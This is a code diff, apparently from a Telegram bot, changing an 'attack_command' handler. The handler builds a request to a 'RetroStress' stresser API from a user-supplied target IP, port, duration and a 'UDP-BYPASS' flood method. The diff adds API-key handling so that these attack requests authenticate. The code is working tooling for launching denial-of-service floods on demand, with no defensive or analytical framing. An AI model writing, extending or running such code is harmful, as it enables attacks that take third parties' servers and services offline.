@@ -1503,14 +1503,21 @@ def attack_command(message):
             bot.reply_to(message, "❌ Server configuration error (RetroStress API not set)!")
             return
             
-        if "[target]" in url or "[port]" in url or "[time]" in url:
+        if "[target]" in url or "[port]" in url or "[time]" in url or "[key]" in url:
             url = url.replace("[target]", ip)\
                      .replace("[port]", str(port))\
                      .replace("[time]", str(duration))\
-                     .replace("[method]", "UDP-BYPASS")
+                     .replace("[method]", "UDP-BYPASS")\
+                     .replace("[key]", key if key else "")
             
-            if "key=0" in url:
+            # Fallback for old templates
+            if "key=0" in url and key:
                 url = url.replace("key=0", f"key={key}")
+            
+            # If key still not in URL and we have a key, append it
+            if "key=" not in url and key:
+                separator = "&" if "?" in url else "?"
+                url += f"{separator}key={key}"
                 
             response = requests.get(url, timeout=30)
         else:
